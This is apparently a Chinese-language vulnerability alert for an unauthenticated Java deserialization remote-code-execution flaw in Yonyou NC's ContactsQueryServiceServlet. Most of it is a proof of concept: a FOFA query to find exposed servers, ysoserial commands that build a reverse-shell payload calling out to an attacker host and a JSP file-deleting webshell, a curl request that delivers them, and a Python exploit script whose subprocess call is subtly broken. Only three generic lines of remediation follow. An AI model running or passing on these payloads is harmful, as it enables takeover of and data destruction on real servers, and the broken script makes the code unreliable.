---
title: 【漏洞预警】用友NC ContactsQueryServiceServlet 反序列化RCE漏洞
---

## 漏洞概述
用友NC ContactsQueryServiceServlet 存在反序列化代码执行漏洞，未经身份认证的攻击者可执行任意命令，控制服务器。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 用友NC ContactsQueryServiceServlet 反序列化代码执行RCE漏洞 |
| 漏洞类型 | RCE (Java反序列化) |
| 影响组件 | 用友NC |
| 严重程度 | 严重 |

## FOFA查询
```
app="用友-UFIDA-NC"
```

## POC
```bash
# 使用ysoserial生成payload (需要Java环境和ysoserial工具)
# 下载ysoserial: https://github.com/frohoff/ysoserial/releases

# 生成反弹shell payload
java -jar ysoserial.jar CommonsCollections6 "bash -i >& /dev/tcp/attacker/port 0>&1" > payload.ser

# 生成写入webshell payload
java -jar ysoserial.jar CommonsCollections6 "echo '<%@page import=\"java.io.*\"%><%new File(request.getParameter(\"f\")).delete();%>' > /tmp/shell.jsp" > payload.ser

# 发送payload
curl -X POST "http://target/servlet/ContactsQueryServiceServlet?pageId=login" \
  -H "Content-Type: application/x-java-serialized-object" \
  -H "X-Authorization: echo" \
  --data-binary @payload.ser
```

Python脚本:
```python
import requests
import subprocess
import os

# 生成payload
def generate_payload(cmd):
    # 使用ysoserial生成
    subprocess.run([
        "java", "-jar", "ysoserial.jar",
        "CommonsCollections6", cmd,
        ">", "payload.ser"
    ], shell=True)
    
    with open("payload.ser", "rb") as f:
        return f.read()

# 发送payload
target = "http://target/servlet/ContactsQueryServiceServlet"
headers = {
    "Content-Type": "application/x-java-serialized-object",
    "X-Authorization": "echo"
}
payload = generate_payload("whoami")
r = requests.post(target, headers=headers, data=payload)
print(r.status_code, r.text)
```

## 修复建议
1. 联系厂商升级版本
2. 部署Web应用防火墙
3. 关闭互联网暴露面